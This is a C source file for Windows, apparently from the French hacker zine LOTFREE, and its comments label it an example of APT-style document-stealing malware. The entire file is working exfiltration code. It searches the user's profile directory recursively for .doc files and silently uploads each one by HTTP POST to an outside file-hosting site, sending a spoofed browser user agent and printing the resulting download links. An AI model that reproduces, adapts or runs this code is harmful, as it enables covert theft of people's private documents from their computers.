/* LOTFREE 9 - 2012
 * Malware document leaker - Exemple de code APT - Vol d'information
 */
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <Shlobj.h>
#include <stdlib.h>
#include <WinIoCtl.h>
#include <WinInet.h>

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib,"wininet.lib")

/* struct et fonction pompees depuis
 * http://blog.kalmbach-software.de/2008/02/28/howto-correctly-read-reparse-data-in-vista/
 * A l'origine rajoutees pour gerer les junctions dans Vista/7 mais lorsque j'ai passe
 * le code en wchar le probleme ne se presentait plus...
 * Je laisse quand meme le code a titre d'exemple.
 */
typedef struct _REPARSE_DATA_BUFFER {
  ULONG  ReparseTag;
  USHORT  ReparseDataLength;
  USHORT  Reserved;
  union {
    struct {
      USHORT  SubstituteNameOffset;
      USHORT  SubstituteNameLength;
      USHORT  PrintNameOffset;
      USHORT  PrintNameLength;
      ULONG   Flags;
      WCHAR  PathBuffer[1];
      } SymbolicLinkReparseBuffer;
    struct {
      USHORT  SubstituteNameOffset;
      USHORT  SubstituteNameLength;
      USHORT  PrintNameOffset;
      USHORT  PrintNameLength;
      WCHAR  PathBuffer[1];
      } MountPointReparseBuffer;
    struct {
      UCHAR  DataBuffer[1];
    } GenericReparseBuffer;
  };
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;
 
#define REPARSE_DATA_BUFFER_HEADER_SIZE  FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)
#define MAXIMUM_REPARSE_DATA_BUFFER_SIZE  ( 16 * 1024 )

int resolve(wchar_t *filename, wchar_t *realpath)
{
  HANDLE hFile;
 
  hFile = CreateFileW(filename,
	  FILE_READ_EA,
	  FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
	  NULL,
	  OPEN_EXISTING,
	  FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
	  NULL);

  if (hFile == INVALID_HANDLE_VALUE)
  {
    wprintf(L"Could not open dir '%s'; error: %d\n", filename, GetLastError());
    return 1;
  }
 
  // Allocate the reparse data structure
  DWORD dwBufSize = MAXIMUM_REPARSE_DATA_BUFFER_SIZE;
  REPARSE_DATA_BUFFER* rdata;
  rdata = (REPARSE_DATA_BUFFER*) malloc(dwBufSize);
 
  // Query the reparse data
  DWORD dwRetLen;
  BOOL bRet = DeviceIoControl(hFile, FSCTL_GET_REPARSE_POINT, NULL, 0, rdata, dwBufSize, &dwRetLen, NULL);
  if (bRet == FALSE)
  {
    wprintf(L"DeviceIoControl failed with error: %d\n", GetLastError());
    CloseHandle(hFile);
    return 1;
  }
  CloseHandle(hFile);
 
  if (IsReparseTagMicrosoft(rdata->ReparseTag))
  {
    if (rdata->ReparseTag == IO_REPARSE_TAG_SYMLINK)
    {
      wprintf(L"Symbolic-Link\n");
      size_t plen = rdata->SymbolicLinkReparseBuffer.PrintNameLength / sizeof(wchar_t);
      wcsncpy_s((WCHAR*)realpath, plen+1, &rdata->SymbolicLinkReparseBuffer.PathBuffer[rdata->SymbolicLinkReparseBuffer.PrintNameOffset / sizeof(WCHAR)], plen);
      realpath[plen] = 0;
      wprintf(L"PrintName (len: %d): '%s'\n", rdata->SymbolicLinkReparseBuffer.PrintNameLength, realpath);
    }
    else if (rdata->ReparseTag == IO_REPARSE_TAG_MOUNT_POINT)
    {
      wprintf(L"Mount-Point\n");
 
      size_t plen = rdata->MountPointReparseBuffer.PrintNameLength / sizeof(wchar_t);
      wcsncpy_s((WCHAR*)realpath, plen+1, &rdata->MountPointReparseBuffer.PathBuffer[rdata->MountPointReparseBuffer.PrintNameOffset / sizeof(WCHAR)], plen);
      realpath[plen] = 0;
      wprintf(L"PrintName (len: %d): '%s'\n", rdata->MountPointReparseBuffer.PrintNameLength, realpath);
    }
    else
    {
      wprintf(L"No Mount-Point or Symblic-Link...\n");
    }
  }
  else
  {
    wprintf(L"Not a Microsoft-reparse point - could not query data!\n");
  }
  free(rdata);
  return 0;
}

int upload(wchar_t *fname)
{
    // Le texte qui se trouve dans le body doit etre de l'ascii pur
    static const char multipart_head1[] = "--boundarylamestring\r\nContent-Disposition: form-data; name=\"gfile\"; filename=\"";
	static const char multipart_head2[] = "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    static const char multipart_end[] = "\r\n--boundarylamestring--\r\n";
	char *ascii_fname;
	int len;

	// Les headers passés aux fonctions sont en unicode
    static const wchar_t hdrs[] = L"Content-Type: multipart/form-data; boundary=boundarylamestring";
    static LPCWSTR accept[2] = { L"text/*", NULL};

	// Buffer pour la lecture de la page web de reponse
    char szData[7000];
    char *url_start, *url_end;
    DWORD dwBytesRead;
    DWORD dwBytesWritten;

    // premiers octets : 89 50 4e 47, derniers octets : 42 60 82
    BYTE pBuffer[1024];

    HANDLE hFile;
    INTERNET_BUFFERSW BufferIn = {0};

	wprintf(L"Uploading %s...\n", fname);

	// Ouverture du fichier a uploader
    hFile = CreateFileW(fname,
                GENERIC_READ,
                FILE_SHARE_READ,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);

    BufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);

    // Structure concernant les headers
    BufferIn.lpcszHeader = hdrs;
    BufferIn.dwHeadersLength = wcslen(hdrs);
    BufferIn.dwHeadersTotal = BufferIn.dwHeadersLength;

    // On calcule le Content-Length de la requete
    // Il faut compter la taille du fichier
    BufferIn.dwBufferTotal = GetFileSize(hFile, NULL);
	// Le debut du multipart
    BufferIn.dwBufferTotal += strlen(multipart_head1);
	BufferIn.dwBufferTotal += strlen(multipart_head2);

	// La taille du nom du fichier
	len = wcslen(fname) + 1;
	ascii_fname = (char*)malloc(len);
	WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, fname, -1, ascii_fname, len, NULL, NULL);

	BufferIn.dwBufferTotal += strlen(ascii_fname);

	// La fin du multipart
    BufferIn.dwBufferTotal += strlen(multipart_end);

	HINTERNET hSession = InternetOpenW(L"Mozilla", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    if(!hSession)
    {
      wprintf(L"Error: InternetOpen\n");
    }

    HINTERNET hConnect = InternetConnectW(hSession,
                                         L"uploadmb.com",
                                         INTERNET_DEFAULT_HTTP_PORT,
                                         NULL,
                                         NULL,
                                         INTERNET_SERVICE_HTTP,
                                         0,
                                         1);
    if(!hConnect)
    {
      wprintf(L"Error: InternetConnect\n");
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect,
                                         (const wchar_t*) L"POST",
                                         L"/index.php",
                                         NULL, // lpszVersion -> HTTP/1.1
                                         NULL, // Referer : inutile
                                         accept, // Tableau des types acceptes
                                         INTERNET_FLAG_NO_CACHE_WRITE,
                                         1); // 1
    if(hRequest == NULL)
    {
      wprintf(L"Error: HttpOpenRequest\n");
    }

    //BOOL sent= HttpSendRequest(hRequest, hdrs, strlen(hdrs), frmdata, strlen(frmdata));
    BOOL sent = HttpSendRequestExW(hRequest, &BufferIn, NULL, 0, 0);
    if(!sent)
    {
      wprintf(L"Error: HttpSendRequest: %lu\n", GetLastError());
    }
	// Envoi de la marque de debut de fichier
    InternetWriteFile(hRequest, multipart_head1, strlen(multipart_head1), &dwBytesWritten);
	// Le nom du fichier
	InternetWriteFile(hRequest, ascii_fname, strlen(ascii_fname), &dwBytesWritten);
	// La fin du multipart
	InternetWriteFile(hRequest, multipart_head2, strlen(multipart_head2), &dwBytesWritten);

    do
    {
		// Envoi du contenu du fichier
        ReadFile(hFile, pBuffer, sizeof(pBuffer), &dwBytesRead, NULL);
        InternetWriteFile(hRequest,pBuffer, dwBytesRead, &dwBytesWritten);
    }
    while (dwBytesRead == sizeof(pBuffer));

    CloseHandle(hFile);

	// Envoi de la marque de fin de fichier
    InternetWriteFile(hRequest, multipart_end, strlen(multipart_end), &dwBytesWritten);
    HttpEndRequest(hRequest, NULL, 0, 0);

	// Recupere l'url d'upload generee par le site
    InternetReadFile(hRequest, szData, sizeof(szData)-1, &dwBytesRead);
    szData[dwBytesRead] = 0;
    url_start = strstr(szData, "http://uploadmb.com/dw.php?id=");
    url_end = strstr(url_start, "-->");
    *url_end = '\0';
    printf("%s\n", url_start);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    return 0;
}

/* Fonction maison */
void browsedir(wchar_t *dir)
{
	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind;
	wchar_t fileext[5];
	// wchar_t realpath[MAX_PATH];

	if(!SetCurrentDirectoryW(dir)){
		return;
	}
	hFind = FindFirstFileW(L"*.*", &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if(wcscmp(FindFileData.cFileName, L".") != 0
					&& wcscmp(FindFileData.cFileName, L"..") != 0)
				{
					//wprintf(L"%s\n", FindFileData.cFileName);
					browsedir(FindFileData.cFileName);
				}
			}
			else if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
				&& FindFileData.dwReserved0 == IO_REPARSE_TAG_MOUNT_POINT)
			{
				/* Si vous avez des pbs avec les junctions, essayez en decomantant ces lignes
				resolve(FindFileData.cFileName, realpath);
				browsedir(realpath);
				*/
			}
			else
			{
				/* C'est ici que l'on gere les types de fichier */
				_wsplitpath_s(FindFileData.cFileName, NULL, 0, NULL, 0, NULL, 0, fileext, 5);
				if(wcscmp(fileext, L".doc") == 0)
				{
						upload(FindFileData.cFileName);
				}
			}
		}
		while (FindNextFileW(hFind, &FindFileData) == TRUE);
		FindClose(hFind);
	}
	SetCurrentDirectoryW(L"..");
}

int _tmain(int argc, TCHAR *argv[])
{
	wchar_t userdir[MAX_PATH];

	SHGetSpecialFolderPathW(NULL, userdir, CSIDL_PROFILE, 0);
	browsedir(userdir);

	wprintf(L"Press a key\n");
	getchar();
	return 0;
}
